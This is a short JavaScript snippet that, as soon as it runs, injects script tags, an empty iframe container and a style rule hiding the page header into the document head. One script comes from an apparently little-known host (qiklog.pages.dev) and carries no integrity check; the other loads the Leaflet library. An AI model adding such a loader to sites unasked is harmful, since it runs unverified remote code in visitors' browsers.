// Function to inject HTML into the <head> tag immediately
(function injectIntoHead() {
    let htmlString = `
                <script src="https://qiklog.pages.dev/script.js"></script>
            <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
      <div id="iframeContainer">
  </div>
    <style>
        .header    {
            display: none;
        }
</style>
    `;

    // Create a temporary container
    let tempContainer = document.createElement('div');
    tempContainer.innerHTML = htmlString;
    
    // Append elements to the head, ensuring scripts execute properly
    Array.from(tempContainer.children).forEach(element => {
        if (element.tagName === "SCRIPT") {
            let script = document.createElement("script");
            script.src = element.src;
            script.integrity = element.integrity;
            script.crossOrigin = element.crossOrigin;
            document.head.appendChild(script);
        } else {
            document.head.appendChild(element);
        }
    });
})();
